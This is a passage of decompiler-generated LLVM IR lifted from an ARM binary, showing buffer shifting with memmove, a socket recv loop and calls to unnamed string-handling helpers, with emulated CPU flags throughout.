  store i32 %v2_a1e0, i32* %v2_a254, align 4
  br i1 %v7_a1e4, label %dec_label_pc_a2a0, label %dec_label_pc_a1d0.dec_label_pc_a1f0thread-pre-split_crit_edge

dec_label_pc_a1d0.dec_label_pc_a1f0thread-pre-split_crit_edge: ; preds = %dec_label_pc_a1d0
  %v0_a1f0.pr.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_a1f0

dec_label_pc_a1f0:                                ; preds = %dec_label_pc_a260, %dec_label_pc_a1d0.dec_label_pc_a1f0thread-pre-split_crit_edge, %dec_label_pc_a2c8
  %v0_a1f0 = phi i32 [ %v3_a2c8, %dec_label_pc_a2c8 ], [ %v0_a1f0.pr.pre, %dec_label_pc_a1d0.dec_label_pc_a1f0thread-pre-split_crit_edge ], [ %v3_a254, %dec_label_pc_a260 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a1f0 = icmp slt i32 %v0_a1f0, 0
  store i1 %v1_a1f0, i1* %cpsr_n.global-to-local, align 1
  %v2_a1f0 = icmp eq i32 %v0_a1f0, 0
  store i1 %v2_a1f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a1f0, label %dec_label_pc_a1f8, label %dec_label_pc_a218

dec_label_pc_a1f8:                                ; preds = %dec_label_pc_a1f0
  %v0_a1f8 = load i32, i32* @r8, align 4
  %v1_a1f8 = add i32 %v0_a1f8, 4
  %v2_a1f8 = inttoptr i32 %v1_a1f8 to i32*
  %v3_a1f8 = load i32, i32* %v2_a1f8, align 4
  store i32 %v3_a1f8, i32* @r4, align 4
  %v1_a1fc = add i32 %v3_a1f8, -1
  %v2_a1fc = icmp ne i32 %v3_a1f8, 0
  store i1 %v2_a1fc, i1* %cpsr_c.global-to-local, align 1
  %v3_a1fc = sub i32 0, %v3_a1f8
  %v4_a1fc = and i32 %v3_a1f8, %v3_a1fc
  %v5_a1fc = icmp slt i32 %v4_a1fc, 0
  store i1 %v5_a1fc, i1* %cpsr_v.global-to-local, align 1
  %v6_a1fc = icmp slt i32 %v1_a1fc, 0
  store i1 %v6_a1fc, i1* %cpsr_n.global-to-local, align 1
  %v7_a1fc = icmp eq i32 %v3_a1f8, 1
  store i1 %v7_a1fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a1fc, label %dec_label_pc_a2d0, label %dec_label_pc_a204

dec_label_pc_a204:                                ; preds = %dec_label_pc_a1f8
  %v1_a204 = add i32 %v0_a1f8, 656
  %v2_a204 = inttoptr i32 %v1_a204 to i32*
  %v3_a204 = load i32, i32* %v2_a204, align 4
  %v0_a208 = load i32, i32* @r5, align 4
  %v2_a208 = sub i32 %v3_a204, %v0_a208
  store i32 %v2_a208, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a20c = icmp slt i32 %v2_a208, 0
  store i1 %v1_a20c, i1* %cpsr_n.global-to-local, align 1
  %v2_a20c = icmp eq i32 %v2_a208, 0
  store i1 %v2_a20c, i1* %cpsr_z.global-to-local, align 1
  %v2_a210 = add i32 %v0_a1f8, 8
  %v3_a210 = inttoptr i32 %v2_a210 to i32*
  store i32 %v2_a208, i32* %v3_a210, align 4
  br i1 %v2_a20c, label %dec_label_pc_a158, label %dec_label_pc_a218

dec_label_pc_a218:                                ; preds = %dec_label_pc_a1f0, %dec_label_pc_a2d0, %dec_label_pc_a204, %dec_label_pc_a358
  %v0_a218 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a218 = icmp slt i32 %v0_a218, 0
  store i1 %v1_a218, i1* %cpsr_n.global-to-local, align 1
  %v2_a218 = icmp eq i32 %v0_a218, 0
  store i1 %v2_a218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a218, label %dec_label_pc_a268, label %dec_label_pc_a220

dec_label_pc_a220:                                ; preds = %dec_label_pc_a218
  %v0_a220 = load i32, i32* @r8, align 4
  %v1_a220 = add i32 %v0_a220, 656
  %v2_a220 = inttoptr i32 %v1_a220 to i32*
  %v3_a220 = load i32, i32* %v2_a220, align 4
  store i32 %v3_a220, i32* %r3.global-to-local, align 4
  %v2_a224 = sub i32 %v3_a220, %v0_a218
  store i32 %v2_a224, i32* %r4.global-to-local, align 4
  store i32 %v2_a224, i32* %r2.global-to-local, align 4
  store i32 %v2_a224, i32* %v2_a220, align 4
  %v0_a230 = load i32, i32* @r7, align 4
  %v1_a230 = load i32, i32* @r5, align 4
  %v2_a230 = add i32 %v1_a230, %v0_a230
  store i32 %v2_a230, i32* %r1.global-to-local, align 4
  store i32 %v0_a230, i32* %r0.global-to-local, align 4
  %v3_a238 = call i32 @_memmove(i32 %v0_a230, i32 %v2_a230, i32 %v2_a224)
  store i32 %v3_a238, i32* %r0.global-to-local, align 4
  %v0_a23c = load i32, i32* @r8, align 4
  %v1_a23c = add i32 %v0_a23c, 656
  %v2_a23c = inttoptr i32 %v1_a23c to i32*
  %v3_a23c = load i32, i32* %v2_a23c, align 4
  store i32 %v3_a23c, i32* @r4, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  %v1_a244 = load i32, i32* %sb.global-to-local, align 4
  %v2_a244 = add i32 %v1_a244, %v3_a23c
  store i32 %v2_a244, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a248 = icmp slt i32 %v3_a23c, 0
  store i1 %v1_a248, i1* %cpsr_n.global-to-local, align 1
  %v2_a248 = icmp eq i32 %v3_a23c, 0
  store i1 %v2_a248, i1* %cpsr_z.global-to-local, align 1
  %v3_a24c = add i32 %v2_a244, 2116
  %v4_a24c = inttoptr i32 %v3_a24c to i8*
  store i8 0, i8* %v4_a24c, align 1
  %v0_a250 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a250, label %dec_label_pc_a268, label %dec_label_pc_a254

dec_label_pc_a254:                                ; preds = %dec_label_pc_a220, %dec_label_pc_a1b8
  %v0_a254 = load i32, i32* @r8, align 4
  %v1_a254 = add i32 %v0_a254, 8
  %v2_a254 = inttoptr i32 %v1_a254 to i32*
  %v3_a254 = load i32, i32* %v2_a254, align 4
  store i32 %v3_a254, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a258 = icmp slt i32 %v3_a254, 0
  store i1 %v1_a258, i1* %cpsr_n.global-to-local, align 1
  %v2_a258 = icmp eq i32 %v3_a254, 0
  store i1 %v2_a258, i1* %cpsr_z.global-to-local, align 1
  %v5_a25c = icmp sgt i32 %v3_a254, 0
  br i1 %v5_a25c, label %dec_label_pc_a1d0, label %dec_label_pc_a260

dec_label_pc_a260:                                ; preds = %dec_label_pc_a254
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_a1f0

dec_label_pc_a268:                                ; preds = %dec_label_pc_a220, %dec_label_pc_a218
  %v0_a268 = load i32, i32* @r8, align 4
  %v1_a268 = add i32 %v0_a268, -1452
  %v2_a268 = inttoptr i32 %v1_a268 to i8*
  %v3_a268 = load i8, i8* %v2_a268, align 1
  %v4_a268 = zext i8 %v3_a268 to i32
  store i32 %v4_a268, i32* %r3.global-to-local, align 4
  %v2_a26c = icmp ugt i8 %v3_a268, 6
  store i1 %v2_a26c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a26c = icmp ult i8 %v3_a268, 7
  store i1 %v6_a26c, i1* %cpsr_n.global-to-local, align 1
  %v7_a26c = icmp eq i8 %v3_a268, 7
  store i1 %v7_a26c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a26c, label %dec_label_pc_a274, label %dec_label_pc_9590

dec_label_pc_a274:                                ; preds = %dec_label_pc_a268
  %v1_a274 = add i32 %v0_a268, 656
  %v2_a274 = inttoptr i32 %v1_a274 to i32*
  %v3_a274 = load i32, i32* %v2_a274, align 4
  store i32 %v3_a274, i32* %r3.global-to-local, align 4
  %v1_a278 = add i32 %v3_a274, -1024
  %v2_a278 = icmp ugt i32 %v3_a274, 1023
  store i1 %v2_a278, i1* %cpsr_c.global-to-local, align 1
  %v3_a278 = sub i32 1023, %v3_a274
  %v4_a278 = and i32 %v3_a278, %v3_a274
  %v5_a278 = icmp slt i32 %v4_a278, 0
  store i1 %v5_a278, i1* %cpsr_v.global-to-local, align 1
  %v6_a278 = icmp slt i32 %v1_a278, 0
  store i1 %v6_a278, i1* %cpsr_n.global-to-local, align 1
  %v7_a278 = icmp eq i32 %v3_a274, 1024
  store i1 %v7_a278, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a278, label %dec_label_pc_a280.loopexit, label %dec_label_pc_a188

dec_label_pc_a280.loopexit:                       ; preds = %dec_label_pc_a274
  %v0_a280.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_a280

dec_label_pc_a280:                                ; preds = %dec_label_pc_a280.loopexit, %dec_label_pc_a164
  %v0_a280 = phi i32 [ %v0_a280.pre, %dec_label_pc_a280.loopexit ], [ %v1_a180, %dec_label_pc_a164 ]
  store i32 %v0_a280, i32* %r0.global-to-local, align 4
  %v1_a284 = add i32 %v0_a280, 64
  store i32 %v1_a284, i32* %r1.global-to-local, align 4
  store i32 960, i32* %r2.global-to-local, align 4
  %v3_a28c = call i32 @_memmove(i32 %v0_a280, i32 %v1_a284, i32 960)
  store i32 %v3_a28c, i32* %r0.global-to-local, align 4
  %v0_a290 = load i32, i32* @r8, align 4
  %v1_a290 = add i32 %v0_a290, 656
  %v2_a290 = inttoptr i32 %v1_a290 to i32*
  %v3_a290 = load i32, i32* %v2_a290, align 4
  store i32 %v3_a290, i32* %r3.global-to-local, align 4
  %v1_a294 = add i32 %v3_a290, -64
  store i32 %v1_a294, i32* @r4, align 4
  store i32 %v1_a294, i32* %v2_a290, align 4
  br label %dec_label_pc_a188

dec_label_pc_a2a0:                                ; preds = %dec_label_pc_a1d0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v3_a2a8 = call i32 @function_13000(i32 36, i32* null)
  %v0_a2ac = load i32, i32* @r4, align 4
  store i32 %v0_a2ac, i32* %r1.global-to-local, align 4
  store i32 %v3_a2a8, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_a2b8 = load i32, i32* @r7, align 4
  store i32 %v0_a2b8, i32* %r0.global-to-local, align 4
  %v4_a2bc = call i32 @function_13acc(i32 %v0_a2b8, i32 %v0_a2ac, i32 %v3_a2a8, i32 11)
  store i32 %v4_a2bc, i32* %r0.global-to-local, align 4
  %v2_a2c0 = add i32 %v4_a2bc, 1
  %v3_a2c0 = icmp eq i32 %v4_a2bc, -1
  store i1 %v3_a2c0, i1* %cpsr_c.global-to-local, align 1
  %v4_a2c0 = sub i32 0, %v4_a2bc
  %v5_a2c0 = and i32 %v2_a2c0, %v4_a2c0
  %v6_a2c0 = icmp slt i32 %v5_a2c0, 0
  store i1 %v6_a2c0, i1* %cpsr_v.global-to-local, align 1
  %v7_a2c0 = icmp slt i32 %v2_a2c0, 0
  store i1 %v7_a2c0, i1* %cpsr_n.global-to-local, align 1
  %v8_a2c0 = icmp eq i32 %v2_a2c0, 0
  store i1 %v8_a2c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a2c0, label %dec_label_pc_a2c8, label %dec_label_pc_a82c

dec_label_pc_a2c8:                                ; preds = %dec_label_pc_a2a0
  %v0_a2c8 = load i32, i32* @r8, align 4
  %v1_a2c8 = add i32 %v0_a2c8, 8
  %v2_a2c8 = inttoptr i32 %v1_a2c8 to i32*
  %v3_a2c8 = load i32, i32* %v2_a2c8, align 4
  store i32 %v3_a2c8, i32* @r6, align 4
  br label %dec_label_pc_a1f0

dec_label_pc_a2d0:                                ; preds = %dec_label_pc_a1f8
  %v0_a2d0 = load i32, i32* @r7, align 4
  store i32 %v0_a2d0, i32* %r0.global-to-local, align 4
  %v1_a2d4 = add i32 %v0_a1f8, 656
  %v2_a2d4 = inttoptr i32 %v1_a2d4 to i32*
  %v3_a2d4 = load i32, i32* %v2_a2d4, align 4
  store i32 %v3_a2d4, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_a2e0 = call i32 @function_13acc(i32 %v0_a2d0, i32 %v3_a2d4, i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32 2)
  store i32 %v5_a2e0, i32* %r0.global-to-local, align 4
  %v1_a2e4 = add i32 %v5_a2e0, 1
  %v2_a2e4 = icmp eq i32 %v5_a2e0, -1
  store i1 %v2_a2e4, i1* %cpsr_c.global-to-local, align 1
  %v3_a2e4 = sub i32 0, %v5_a2e0
  %v4_a2e4 = and i32 %v1_a2e4, %v3_a2e4
  %v5_a2e4 = icmp slt i32 %v4_a2e4, 0
  store i1 %v5_a2e4, i1* %cpsr_v.global-to-local, align 1
  %v6_a2e4 = icmp slt i32 %v1_a2e4, 0
  store i1 %v6_a2e4, i1* %cpsr_n.global-to-local, align 1
  %v7_a2e4 = icmp eq i32 %v1_a2e4, 0
  store i1 %v7_a2e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a2e4, label %dec_label_pc_a218, label %dec_label_pc_a2ec

dec_label_pc_a2ec:                                ; preds = %dec_label_pc_a2d0
  %v0_a2ec = load i32, i32* @r8, align 4
  %v1_a2ec = add i32 %v0_a2ec, 656
  %v2_a2ec = inttoptr i32 %v1_a2ec to i32*
  %v3_a2ec = load i32, i32* %v2_a2ec, align 4
  store i32 %v3_a2ec, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v0_a2f8 = load i32, i32* @r7, align 4
  store i32 %v0_a2f8, i32* %r0.global-to-local, align 4
  %v5_a2fc = call i32 @function_13acc(i32 %v0_a2f8, i32 %v3_a2ec, i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32 2)
  %v1_a300 = load i32, i32* %sb.global-to-local, align 4
  %v2_a300 = add i32 %v1_a300, %v5_a2fc
  store i32 %v2_a300, i32* %ip.global-to-local, align 4
  store i32 %v5_a2fc, i32* @r5, align 4
  store i32 %v5_a2fc, i32* %r1.global-to-local, align 4
  %v0_a30c = load i32, i32* @r7, align 4
  store i32 %v0_a30c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14388.97 to i32), i32* %r2.global-to-local, align 4
  %v0_a314 = load i32, i32* @r4, align 4
  store i32 %v0_a314, i32* %r3.global-to-local, align 4
  %v0_a318 = load i32, i32* @r6, align 4
  %v1_a318 = trunc i32 %v0_a318 to i8
  %v3_a318 = add i32 %v2_a300, 2114
  %v4_a318 = inttoptr i32 %v3_a318 to i8*
  store i8 %v1_a318, i8* %v4_a318, align 1
  %v4_a31c = call i32 @function_13acc(i32 %v0_a30c, i32 %v5_a2fc, i32 ptrtoint (i32* @global_var_14388.97 to i32), i32 %v0_a314)
  store i32 %v4_a31c, i32* %r0.global-to-local, align 4
  %v1_a320 = add i32 %v4_a31c, 1
  %v2_a320 = icmp eq i32 %v4_a31c, -1
  store i1 %v2_a320, i1* %cpsr_c.global-to-local, align 1
  %v3_a320 = sub i32 0, %v4_a31c
  %v4_a320 = and i32 %v1_a320, %v3_a320
  %v5_a320 = icmp slt i32 %v4_a320, 0
  store i1 %v5_a320, i1* %cpsr_v.global-to-local, align 1
  %v6_a320 = icmp slt i32 %v1_a320, 0
  store i1 %v6_a320, i1* %cpsr_n.global-to-local, align 1
  %v7_a320 = icmp eq i32 %v1_a320, 0
  store i1 %v7_a320, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a320, label %dec_label_pc_a344, label %dec_label_pc_a328

dec_label_pc_a328:                                ; preds = %dec_label_pc_a2ec
  %v0_a328 = load i32, i32* @r7, align 4
  store i32 %v0_a328, i32* %r0.global-to-local, align 4
  %v0_a32c = load i32, i32* @r5, align 4
  store i32 %v0_a32c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_14388.97 to i32), i32* %r2.global-to-local, align 4
  %v0_a334 = load i32, i32* @r4, align 4
  store i32 %v0_a334, i32* %r3.global-to-local, align 4
  %v4_a338 = call i32 @function_13acc(i32 %v0_a328, i32 %v0_a32c, i32 ptrtoint (i32* @global_var_14388.97 to i32), i32 %v0_a334)
  %v1_a33c = load i32, i32* %sb.global-to-local, align 4
  %v2_a33c = add i32 %v1_a33c, %v4_a338
  store i32 %v2_a33c, i32* %r0.global-to-local, align 4
  %v0_a340 = load i32, i32* @r6, align 4
  %v1_a340 = trunc i32 %v0_a340 to i8
  %v3_a340 = add i32 %v2_a33c, 2116
  %v4_a340 = inttoptr i32 %v3_a340 to i8*
  store i8 %v1_a340, i8* %v4_a340, align 1
  br label %dec_label_pc_a344

dec_label_pc_a344:                                ; preds = %dec_label_pc_a2ec, %dec_label_pc_a328
  %v0_a344 = load i32, i32* @r7, align 4
  store i32 %v0_a344, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_a34c = inttoptr i32 %v0_a344 to i8*
  %v3_a34c = call i32 @function_13b34(i8* %v2_a34c, i32 16)
  store i32 %v3_a34c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a350 = icmp slt i32 %v3_a34c, 0
  store i1 %v1_a350, i1* %cpsr_n.global-to-local, align 1
  %v2_a350 = icmp eq i32 %v3_a34c, 0
  store i1 %v2_a350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a350, label %dec_label_pc_aadc, label %dec_label_pc_a358

dec_label_pc_a358:                                ; preds = %dec_label_pc_a344
  %v1_a358 = add i32 %v3_a34c, 2
  store i32 %v1_a358, i32* %r6.global-to-local, align 4
  %v1_a35c = load i32, i32* @r8, align 4
  %v2_a35c = add i32 %v1_a35c, 8
  %v3_a35c = inttoptr i32 %v2_a35c to i32*
  store i32 %v1_a358, i32* %v3_a35c, align 4
  br label %dec_label_pc_a218

dec_label_pc_a364:                                ; preds = %dec_label_pc_9a0c
  %v0_a364 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_a364, i32* %r1.global-to-local, align 4
  %v0_a368 = load i32, i32* @r6, align 4
  store i32 %v0_a368, i32* @r0, align 4
  %v2_a36c = inttoptr i32 %v0_a368 to i8*
  %v3_a36c = call i32 @function_13a30(i8* %v2_a36c, i32 %v0_a364)
  store i32 %v3_a36c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9a24

dec_label_pc_a374:                                ; preds = %dec_label_pc_9588
  %v0_a374 = call i32* @__errno_location()
  %v2_a374 = ptrtoint i32* %v0_a374 to i32
  store i32 %v2_a374, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v2_a374, i32* @r4, align 4
  br label %dec_label_pc_a380

dec_label_pc_a380:                                ; preds = %dec_label_pc_a3a0.dec_label_pc_a380_crit_edge, %dec_label_pc_a374
  %v1_a380 = phi i32 [ %v1_a380.pre, %dec_label_pc_a3a0.dec_label_pc_a380_crit_edge ], [ %v2_a374, %dec_label_pc_a374 ]
  %v0_a380 = phi i32 [ %v0_a380.pre, %dec_label_pc_a3a0.dec_label_pc_a380_crit_edge ], [ 0, %dec_label_pc_a374 ]
  %v2_a380 = inttoptr i32 %v1_a380 to i32*
  store i32 %v0_a380, i32* %v2_a380, align 4
  store i32 %v2_8fd8, i32* %r1.global-to-local, align 4
  %v0_a388 = load i32, i32* @r8, align 4
  %v1_a388 = add i32 %v0_a388, -1456
  %v2_a388 = inttoptr i32 %v1_a388 to i32*
  %v3_a388 = load i32, i32* %v2_a388, align 4
  store i32 %v3_a388, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_a394 = call i32 @_recv(i32 %v3_a388, i32 %v2_8fd8, i32 10240, i32 16384)
  store i32 %v4_a394, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_a398 = icmp slt i32 %v4_a394, 0
  store i1 %v1_a398, i1* %cpsr_n.global-to-local, align 1
  %v2_a398 = icmp eq i32 %v4_a394, 0
  store i1 %v2_a398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a398, label %dec_label_pc_a678, label %dec_label_pc_a3a0

dec_label_pc_a3a0:                                ; preds = %dec_label_pc_a380
  %v2_a3a0 = add i32 %v4_a394, 1
  %v3_a3a0 = icmp eq i32 %v4_a394, -1
  store i1 %v3_a3a0, i1* %cpsr_c.global-to-local, align 1
  %v4_a3a0 = sub i32 0, %v4_a394
  %v5_a3a0 = and i32 %v2_a3a0, %v4_a3a0
  %v6_a3a0 = icmp slt i32 %v5_a3a0, 0
  store i1 %v6_a3a0, i1* %cpsr_v.global-to-local, align 1
  %v7_a3a0 = icmp slt i32 %v2_a3a0, 0
  store i1 %v7_a3a0, i1* %cpsr_n.global-to-local, align 1
  %v8_a3a0 = icmp eq i32 %v2_a3a0, 0
  store i1 %v8_a3a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a3a0, label %dec_label_pc_a3a8, label %dec_label_pc_a3a0.dec_label_pc_a380_crit_edge

dec_label_pc_a3a0.dec_label_pc_a380_crit_edge:    ; preds = %dec_label_pc_a3a0
  %v0_a380.pre = load i32, i32* @r5, align 4
  %v1_a380.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a380

dec_label_pc_a3a8:                                ; preds = %dec_label_pc_a3a0
  %v0_a3a8 = load i32, i32* @r4, align 4
  %v1_a3a8 = inttoptr i32 %v0_a3a8 to i32*
  %v2_a3a8 = load i32, i32* %v1_a3a8, align 4
  store i32 %v2_a3a8, i32* %r3.global-to-local, align 4
  %v1_a3ac = add i32 %v2_a3a8, -11
  %v2_a3ac = icmp ugt i32 %v2_a3a8, 10
  store i1 %v2_a3ac, i1* %cpsr_c.global-to-local, align 1
  %v3_a3ac = sub i32 10, %v2_a3a8
  %v4_a3ac = and i32 %v3_a3ac, %v2_a3a8
  %v5_a3ac = icmp slt i32 %v4_a3ac, 0
  store i1 %v5_a3ac, i1* %cpsr_v.global-to-local, align 1
  %v6_a3ac = icmp slt i32 %v1_a3ac, 0
  store i1 %v6_a3ac, i1* %cpsr_n.global-to-local, align 1
  %v7_a3ac = icmp eq i32 %v2_a3a8, 11
  store i1 %v7_a3ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a3ac, label %dec_label_pc_a7f0, label %dec_label_pc_a3b4

dec_label_pc_a3b4:                                ; preds = %dec_label_pc_a3a8, %dec_label_pc_a678
  %v0_a3b4 = load i32, i32* @r8, align 4
  %v1_a3b4 = add i32 %v0_a3b4, -1456
  %v2_a3b4 = inttoptr i32 %v1_a3b4 to i32*
  %v3_a3b4 = load i32, i32* %v2_a3b4, align 4
  store i32 %v3_a3b4, i32* %r0.global-to-local, align 4
  %v1_a3b8 = call i32 @close(i32 %v3_a3b4)
  store i32 %v1_a3b8, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_a3c4 = load i32, i32* @r8, align 4
  %v2_a3c4 = add i32 %v1_a3c4, -1456
  %v3_a3c4 = inttoptr i32 %v2_a3c4 to i32*
  store i32 -1, i32* %v3_a3c4, align 4
  %v0_a3c8 = load i32, i32* %r1.global-to-local, align 4
  %v1_a3c8 = trunc i32 %v0_a3c8 to i8
  %v2_a3c8 = load i32, i32* @r8, align 4
  %v3_a3c8 = add i32 %v2_a3c8, -1452
  %v4_a3c8 = inttoptr i32 %v3_a3c8 to i8*
  store i8 %v1_a3c8, i8* %v4_a3c8, align 1
  br label %dec_label_pc_9590

dec_label_pc_a3d0:                                ; preds = %dec_label_pc_a080, %dec_label_pc_a0a4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_a3d8 = call i32 @function_13000(i32 37, i32* null)
  %v0_a3dc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a3dc, i32* @r1, align 4
  store i32 %v3_a3d8, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_a3e8 = call i32 @function_13d5c(i8* %tmp197, i32 %v0_a3dc, i32 %v3_a3d8)
  store i32 %v4_a3e8, i32* %r0.global-to-local, align 4
  %v1_a3f0 = add i32 %v4_a3e8, 1
  %v2_a3f0 = icmp eq i32 %v4_a3e8, -1
  store i1 %v2_a3f0, i1* %cpsr_c.global-to-local, align 1
  %v3_a3f0 = sub i32 0, %v4_a3e8
  %v4_a3f0 = and i32 %v1_a3f0, %v3_a3f0
  %v5_a3f0 = icmp slt i32 %v4_a3f0, 0
  store i1 %v5_a3f0, i1* %cpsr_v.global-to-local, align 1
  %v6_a3f0 = icmp slt i32 %v1_a3f0, 0
  store i1 %v6_a3f0, i1* %cpsr_n.global-to-local, align 1
  %v7_a3f0 = icmp eq i32 %v1_a3f0, 0
  store i1 %v7_a3f0, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r5, align 4
  br i1 %v7_a3f0, label %dec_label_pc_a618, label %dec_label_pc_a3fc

dec_label_pc_a3fc:                                ; preds = %dec_label_pc_a3d0
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_a404 = call i32 @function_13000(i32 37, i32* null)
  %v0_a408 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_a408, i32* @r1, align 4
  store i32 %v3_a404, i32* %r2.global-to-local, align 4
  store i32 %v2_8fd8, i32* %r0.global-to-local, align 4
  %v4_a414 = call i32 @function_13d5c(i8* %tmp197, i32 %v0_a408, i32 %v3_a404)
  store i32 %v4_a414, i32* %r0.global-to-local, align 4
  store i32 %v2_9a54, i32* %ip.global-to-local, align 4
  %v2_a420 = add i32 %v4_a414, %v2_9a54
  store i32 %v2_a420, i32* %r3.global-to-local, align 4
  %v1_a424 = load i32, i32* @r5, align 4
  %v2_a424 = add i32 %v1_a424, %v2_a420
  %v3_a424 = inttoptr i32 %v2_a424 to i8*
  %v4_a424 = load i8, i8* %v3_a424, align 1
  store i32 %v2_8fd8, i32* %lr.global-to-local, align 4
  %v2_a42c = icmp ugt i8 %v4_a424, 31
  store i1 %v2_a42c, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v6_a42c = icmp ult i8 %v4_a424, 32
  store i1 %v6_a42c, i1* %cpsr_n.global-to-local, align 1
  %v7_a42c = icmp eq i8 %v4_a424, 32
  store i1 %v7_a42c, i1* %cpsr_z.global-to-local, align 1
  %v2_a434 = zext i1 %v7_a42c to i32
  %v2_a434.v4_a414 = add i32 %v2_a434, %v4_a414
  store i32 %v2_a434.v4_a414, i32* @r4, align 4
  %v2_a438 = add i32 %v2_a434.v4_a414, %v2_8fd8
  store i32 %v2_a438, i32* @r6, align 4
  store i32 %v2_a438, i32* %r0.global-to-local, align 4
  %v1_a440 = load i32, i32* %fp.global-to-local, align 4
  %v2_a440 = sub i32 %v1_a440, %v2_a434.v4_a414
  store i32 %v2_a440, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_a44c = call i32 @function_13acc(i32 %v2_a438, i32 %v2_a440, i32 ptrtoint ([3 x i8]* @global_var_1435c.89 to i32), i32 2)
  store i32 %v5_a44c, i32* %r0.global-to-local, align 4
  %v1_a450 = add i32 %v5_a44c, 1
  %v2_a450 = icmp eq i32 %v5_a44c, -1
  store i1 %v2_a450, i1* %cpsr_c.global-to-local, align 1
  %v3_a450 = sub i32 0, %v5_a44c
  %v4_a450 = and i32 %v1_a450, %v3_a450
  %v5_a450 = icmp slt i32 %v4_a450, 0
  store i1 %v5_a450, i1* %cpsr_v.global-to-local, align 1
  %v6_a450 = icmp slt i32 %v1_a450, 0
  store i1 %v6_a450, i1* %cpsr_n.global-to-local, align 1
  %v7_a450 = icmp eq i32 %v1_a450, 0
  store i1 %v7_a450, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_a44c, i32* @r7, align 4
  br i1 %v7_a450, label %dec_label_pc_a618, label %dec_label_pc_a45c

dec_label_pc_a45c:                                ; preds = %dec_label_pc_a3fc
  store i32 %v2_9a54, i32* %r1.global-to-local, align 4
  %v1_a464 = load i32, i32* @r4, align 4
  %v2_a464 = add i32 %v1_a464, %v2_9a54
  %v1_a468 = add i32 %v5_a44c, -1
  %v2_a468 = icmp ne i32 %v5_a44c, 0
  store i1 %v2_a468, i1* %cpsr_c.global-to-local, align 1
  %v3_a468 = sub i32 0, %v5_a44c
  %v4_a468 = and i32 %v5_a44c, %v3_a468
  %v5_a468 = icmp slt i32 %v4_a468, 0
  store i1 %v5_a468, i1* %cpsr_v.global-to-local, align 1
  %v6_a468 = icmp slt i32 %v1_a468, 0
  store i1 %v6_a468, i1* %cpsr_n.global-to-local, align 1
  %v7_a468 = icmp eq i32 %v5_a44c, 1
  store i1 %v7_a468, i1* %cpsr_z.global-to-local, align 1
